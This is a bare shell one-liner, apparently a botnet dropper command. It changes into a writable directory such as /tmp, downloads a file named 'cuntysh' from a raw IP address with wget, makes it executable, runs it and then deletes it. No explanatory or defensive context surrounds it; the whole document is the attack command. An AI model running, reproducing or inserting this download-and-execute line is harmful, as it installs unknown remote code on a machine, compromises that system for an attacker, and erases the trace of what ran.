cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.157.228.223/cuntysh; chmod +x cuntysh; ./cuntysh; rm -rf cuntysh
